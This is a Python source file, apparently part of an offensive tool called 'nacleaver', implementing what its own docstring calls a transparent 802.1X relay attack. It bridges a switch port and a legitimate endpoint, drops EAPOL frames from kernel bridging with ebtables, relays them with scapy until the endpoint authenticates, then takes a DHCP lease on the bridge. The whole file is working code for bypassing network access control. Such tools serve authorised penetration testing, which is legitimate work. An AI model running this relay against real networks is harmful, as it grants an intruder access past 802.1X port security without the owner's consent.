import logging
import queue
import time
from dataclasses import dataclass
from multiprocessing import Event, Process, Queue

from core.utils import (
    Cleanup,
    get_iface_ip,
    get_iface_mac,
    get_iface_state,
    run_subprocess,
)

logger = logging.getLogger('nacleaver')


@dataclass
class RelayResult:
    success: bool
    auth_completed: bool
    obtained_ip: str | None
    endpoint_mac: str | None
    duration_sec: float
    eapol_frames_relayed: int
    error: str | None = None


def _parse_eap_type(pkt) -> str:
    """Extract EAP code + type string for logging. Never raises."""
    try:
        if pkt.haslayer("EAP"):
            code = pkt["EAP"].code
            typ = getattr(pkt["EAP"], "type", None)
            return f"code={code} type={typ}"
    except Exception:
        pass
    return "unknown"


def _relay_switch_to_endpoint(
    iface_switch: str,
    iface_endpoint: str,
    event_queue: Queue,
    stop_event: Event,
) -> None:
    """Child process: sniff EAPOL on switch-side interface and forward to endpoint side."""
    from scapy.all import sniff, sendp

    def handler(pkt):
        try:
            sendp(pkt, iface=iface_endpoint, verbose=False)
            eap_info = _parse_eap_type(pkt)
            event_queue.put({"direction": "sw→ep", "type": eap_info})
            # Check for EAP-Success (code=3)
            try:
                if pkt.haslayer("EAP") and pkt["EAP"].code == 3:
                    event_queue.put({"event": "EAP_SUCCESS"})
            except Exception:
                pass
        except Exception:
            pass

    # Loop with short timeouts so stop_event is checked regularly
    while not stop_event.is_set():
        sniff(
            iface=iface_switch,
            filter="ether proto 0x888e",
            store=False,
            timeout=2,
            prn=handler,
        )


def _relay_endpoint_to_switch(
    iface_endpoint: str,
    iface_switch: str,
    event_queue: Queue,
    stop_event: Event,
) -> None:
    """Child process: sniff EAPOL on endpoint-side interface and forward to switch side."""
    from scapy.all import sniff, sendp

    def handler(pkt):
        try:
            sendp(pkt, iface=iface_switch, verbose=False)
            eap_info = _parse_eap_type(pkt)
            event_queue.put({"direction": "ep→sw", "type": eap_info})
        except Exception:
            pass

    while not stop_event.is_set():
        sniff(
            iface=iface_endpoint,
            filter="ether proto 0x888e",
            store=False,
            timeout=2,
            prn=handler,
        )


def setup_bridge(iface_switch: str, iface_endpoint: str) -> str:
    """Create a Linux bridge, add both interfaces, block EAPOL from kernel bridging."""
    bridge_name = "nacleaver_br"

    rc, _, err = run_subprocess(["ip", "link", "add", "name", bridge_name, "type", "bridge"])
    if rc != 0 and "already exists" not in err:
        raise RuntimeError(f"Failed to create bridge {bridge_name}: {err}")

    run_subprocess(["ip", "link", "set", bridge_name, "type", "bridge", "stp_state", "0"])

    run_subprocess(["ip", "link", "set", iface_switch, "master", bridge_name])
    run_subprocess(["ip", "link", "set", iface_endpoint, "master", bridge_name])

    run_subprocess(["ip", "link", "set", bridge_name, "up"])
    run_subprocess(["ip", "link", "set", iface_switch, "up"])
    run_subprocess(["ip", "link", "set", iface_endpoint, "up"])

    # Drop EAPOL frames in kernel bridge so we relay them manually
    rc_ebt, _, err_ebt = run_subprocess([
        "ebtables", "-t", "broute", "-A", "BROUTING",
        "-p", "0x888e", "-j", "DROP",
    ])
    if rc_ebt == 0:
        Cleanup.set_ebtables_modified()
    else:
        logger.warning(f"[relay] ebtables rule failed (ebtables not available?): {err_ebt}")

    Cleanup.register_bridge(bridge_name)

    logger.info(f"[relay] Bridge {bridge_name} created with {iface_switch} and {iface_endpoint}")
    return bridge_name


def teardown_bridge(bridge_name: str, iface_switch: str, iface_endpoint: str) -> None:
    """Remove bridge and flush ebtables rules. Swallows all exceptions."""
    try:
        run_subprocess(["ebtables", "-t", "broute", "-F", "BROUTING"])
    except Exception as e:
        logger.debug(f"[relay] ebtables flush error: {e}")
    try:
        run_subprocess(["ip", "link", "set", iface_switch, "nomaster"])
    except Exception as e:
        logger.debug(f"[relay] nomaster {iface_switch} error: {e}")
    try:
        run_subprocess(["ip", "link", "set", iface_endpoint, "nomaster"])
    except Exception as e:
        logger.debug(f"[relay] nomaster {iface_endpoint} error: {e}")
    try:
        run_subprocess(["ip", "link", "delete", bridge_name])
    except Exception as e:
        logger.debug(f"[relay] bridge delete error: {e}")


def run_relay(
    iface_switch: str,
    iface_endpoint: str,
    auth_timeout: int = 90,
    dhcp_timeout: int = 15,
    verbose: bool = False,
) -> RelayResult:
    """
    Transparent 802.1X relay attack.
    Bridges all non-EAPOL traffic via Linux bridge kernel.
    Relays EAPOL frames bidirectionally via multiprocessing sniff loops.
    When EAP-Success is seen, obtains DHCP lease on the bridge interface.
    """
    # Validate both interfaces
    for iface in (iface_switch, iface_endpoint):
        state = get_iface_state(iface)
        if state not in ('up', 'unknown'):
            return RelayResult(
                success=False,
                auth_completed=False,
                obtained_ip=None,
                endpoint_mac=None,
                duration_sec=0.0,
                eapol_frames_relayed=0,
                error=f"Interface {iface} is not up (state={state})",
            )

    try:
        endpoint_mac = get_iface_mac(iface_endpoint)
    except FileNotFoundError as e:
        return RelayResult(
            success=False,
            auth_completed=False,
            obtained_ip=None,
            endpoint_mac=None,
            duration_sec=0.0,
            eapol_frames_relayed=0,
            error=str(e),
        )

    try:
        bridge_name = setup_bridge(iface_switch, iface_endpoint)
    except RuntimeError as e:
        return RelayResult(
            success=False,
            auth_completed=False,
            obtained_ip=None,
            endpoint_mac=endpoint_mac,
            duration_sec=0.0,
            eapol_frames_relayed=0,
            error=str(e),
        )

    event_queue: Queue = Queue()
    stop_event: Event = Event()

    p1 = Process(
        target=_relay_switch_to_endpoint,
        args=(iface_switch, iface_endpoint, event_queue, stop_event),
        daemon=True,
    )
    p2 = Process(
        target=_relay_endpoint_to_switch,
        args=(iface_endpoint, iface_switch, event_queue, stop_event),
        daemon=True,
    )
    p1.start()
    p2.start()

    logger.info(f"[relay] Relay started: {iface_switch} ↔ {iface_endpoint} (timeout={auth_timeout}s)")

    start = time.time()
    frames_relayed = 0
    auth_completed = False

    while time.time() - start < auth_timeout:
        try:
            msg = event_queue.get(timeout=1.0)
            if "event" in msg and msg["event"] == "EAP_SUCCESS":
                logger.info("[relay] EAP-Success received — authentication completed!")
                auth_completed = True
                break
            if "direction" in msg:
                frames_relayed += 1
                if verbose:
                    logger.debug(f"[relay] EAPOL {msg['direction']} {msg.get('type', '')}")
        except queue.Empty:
            continue

    # Signal child processes to stop
    stop_event.set()
    p1.join(timeout=3)
    p2.join(timeout=3)
    if p1.is_alive():
        p1.terminate()
    if p2.is_alive():
        p2.terminate()

    duration = time.time() - start

    if not auth_completed:
        logger.warning(f"[relay] Auth timeout after {duration:.1f}s ({frames_relayed} EAPOL frames relayed)")
        teardown_bridge(bridge_name, iface_switch, iface_endpoint)
        return RelayResult(
            success=False,
            auth_completed=False,
            obtained_ip=None,
            endpoint_mac=endpoint_mac,
            duration_sec=duration,
            eapol_frames_relayed=frames_relayed,
            error="Authentication timed out",
        )

    # Obtain IP via bridge interface
    logger.info(f"[relay] Requesting DHCP lease on bridge {bridge_name} ...")
    run_subprocess(["dhclient", "-v", "-1", bridge_name], timeout=dhcp_timeout)
    obtained_ip = get_iface_ip(bridge_name)

    if obtained_ip:
        logger.info(f"[relay] DHCP lease obtained on bridge: {obtained_ip}")
    else:
        logger.warning(f"[relay] No IP obtained on bridge {bridge_name}")

    return RelayResult(
        success=obtained_ip is not None,
        auth_completed=True,
        obtained_ip=obtained_ip,
        endpoint_mac=endpoint_mac,
        duration_sec=duration,
        eapol_frames_relayed=frames_relayed,
        error=None if obtained_ip else "Auth completed but no DHCP lease obtained",
    )


if __name__ == "__main__":
    import sys
    from rich import print as rprint
    from core.utils import require_root, setup_logging
    require_root()
    setup_logging(verbose=True)
    if len(sys.argv) < 3:
        print("Usage: sudo python3 core/relay.py <iface_switch> <iface_endpoint>")
        sys.exit(1)
    iface_sw = sys.argv[1]
    iface_ep = sys.argv[2]
    result = run_relay(iface_sw, iface_ep, verbose=True)
    rprint(result)
